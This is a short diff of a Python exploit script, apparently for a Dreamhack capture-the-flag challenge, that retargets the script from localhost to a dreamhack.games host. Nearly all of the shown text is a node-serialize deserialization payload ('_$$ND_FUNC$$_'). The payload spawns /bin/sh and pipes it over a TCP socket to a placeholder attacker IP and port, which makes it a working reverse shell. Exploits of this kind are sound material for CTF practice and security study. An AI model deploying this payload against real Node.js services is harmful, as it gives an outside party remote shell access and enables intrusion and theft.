@@ -32,12 +32,12 @@ class Exploit:
             self.send_payload(p)
 
 if __name__ == "__main__":
-    BASE_URL = "http://127.0.0.1:3000/"
+    BASE_URL = "http://host1.dreamhack.games:10243/"
     PAYLOAD_RCE = {
         "rce": "_$$ND_FUNC$$_function (){"
                "var net=require('net'),sh=require('child_process').spawn('/bin/sh',[]);"
                "var client=new net.Socket();"
-               "client.connect(<YOUR_PORT>,'<YOUR_IP>',function(){"
+               "client.connect(<YOUR_PORT>,'<YOUR_TCP>',function(){"
                "client.pipe(sh.stdin);"
                "sh.stdout.pipe(client);"
                "sh.stderr.pipe(client);"
